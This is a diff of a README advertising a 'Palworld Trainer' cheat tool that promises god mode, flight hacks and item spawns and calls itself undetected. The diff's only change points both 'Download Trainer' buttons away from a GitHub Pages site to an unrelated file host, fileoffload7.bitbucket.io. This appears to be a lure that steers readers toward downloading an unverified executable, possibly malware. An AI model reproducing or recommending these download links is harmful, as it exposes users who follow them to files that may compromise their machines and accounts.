@@ -6,14 +6,14 @@
 
 Enter the **Palworld Trainer**. With one hotkey press, you unlock **god mode**, **infinite stamina**, **instant crafting**, **Pal buffs**, **item spawns**, and **flight hacks**. It's a clean, undetected, offline-ready cheat tool made for one thing—*breaking* the game (in a good way).
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/palworld/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🎮 Product Description
 
 This is a cheat **trainer** built for Palworld’s PC version (Steam). It connects directly to your running game and gives you real-time toggleable powers—everything from invincibility to flight and resource spawning. It’s perfect for solo players, mod testers, or anyone who just wants to enjoy the game without grind.
 
-[![Download Trainer](https://yougame.biz/proxy.php?image=https%3A%2F%2Fwh-satano.ru%2Fstorage%2Fmedia%2Fpalworlds1.jpg&hash=feadca3a057a0a5326d48f73808d622a)](https://wecheaters.github.io/cheats/palworld/)
+[![Download Trainer](https://yougame.biz/proxy.php?image=https%3A%2F%2Fwh-satano.ru%2Fstorage%2Fmedia%2Fpalworlds1.jpg&hash=feadca3a057a0a5326d48f73808d622a)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🔧 Core Features of the Palworld Trainer
